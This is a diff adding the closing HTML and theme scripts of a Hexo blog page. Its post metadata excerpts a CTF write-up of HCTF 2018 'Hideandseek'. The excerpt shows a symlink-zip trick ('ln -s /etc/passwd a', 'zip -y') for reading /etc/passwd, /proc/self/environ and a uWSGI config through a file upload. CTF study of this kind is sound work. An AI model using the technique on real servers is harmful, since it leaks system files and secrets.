+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[HCTF 2018]Hideandseek",
+          url: "http://example.com/2025/05/28/[HCTF%202018]Hideandseek/",
+          excerpt: "",
+          description: "",
+          stripContent: "开题就让我们登录，我们随便登录一个账户  然后这里需要我们上传一个zip文件 我们随便上传一个普通zip文件，但没有任何回显  zip软链接读取文件 猜测是上传一个软链接zip 在linux里制作软链接zip： 12ln -s /etc/passwd azip -y passwd.zip a 然后上传a.zip文件  有回显了 读取/proc/self/environ 读取/app/uwsgi.ini 注意DUWSGI_INI=/app/uwsgi.ini 1uWSGI是一个Web服务器，它实现",
+          date: "Wed May 28 2025 18:30:41 GMT+0800",
+          updated: "Wed May 28 2025 19:00:08 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
